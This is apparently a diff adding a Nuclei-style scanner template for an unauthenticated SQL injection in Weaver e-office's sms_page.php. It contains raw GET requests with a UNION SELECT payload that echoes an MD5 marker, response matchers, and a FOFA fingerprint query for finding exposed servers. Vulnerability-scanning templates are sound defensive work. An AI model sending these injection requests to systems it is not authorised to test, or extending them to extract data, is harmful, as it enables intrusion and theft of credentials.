@@ -1,0 +1,41 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - ~4297f44b13955235245b2497399d7a93~
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
+          Host: {{Hostname}}
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - ~4297f44b13955235245b2497399d7a93~
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7e,md5(123123),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1
+          Host: {{Hostname}}
+id: Weaver-e-office-sms_page_php-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: ((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server:    couchdb") || banner="general/login/index.php"
+        泛微e-office sms_page.php接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 泛微e-office sms_page.php sql注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/G5zmpTD83ydcT76KDo3sng
+    severity: high
+    tags:
+        - e-office
+        - 泛微e-office
+        - couchdb
